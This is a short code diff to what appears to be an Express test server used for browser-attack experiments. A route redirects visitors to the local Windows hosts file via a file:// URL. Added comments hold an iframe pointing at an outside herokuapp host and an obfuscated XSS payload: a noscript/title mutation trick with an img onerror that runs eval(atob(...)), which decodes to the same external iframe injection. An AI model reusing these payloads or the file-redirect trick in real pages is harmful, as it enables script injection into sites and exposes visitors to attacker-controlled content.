@@ -19,6 +19,7 @@ const print = s => {
 
 app.get('/', (req,res) => {
   res.statusCode = 302
+  print("access from somewhere")
   res.setHeader('Location', 'file:///Windows/system32/drivers/etc/hosts');
   res.end('Hello World');
 })
@@ -27,4 +28,6 @@ app.listen(port, () => {
   print("example")
 })
 
-// document.write(`<iframe src="http://"></iframe>`)
+// document.write('<iframe src="https://dirty-one-test.herokuapp.com/"></iframe>')
+
+// {/* <noscript><p title="</noscript><img src=x onerror=eval(atob('ZG9jdW1lbnQud3JpdGUoJzxpZnJhbWUgc3JjPSJodHRwczovL2RpcnR5LW9uZS10ZXN0Lmhlcm9rdWFwcC5jb20vIj48L2lmcmFtZT4nKQ==')>"> */}
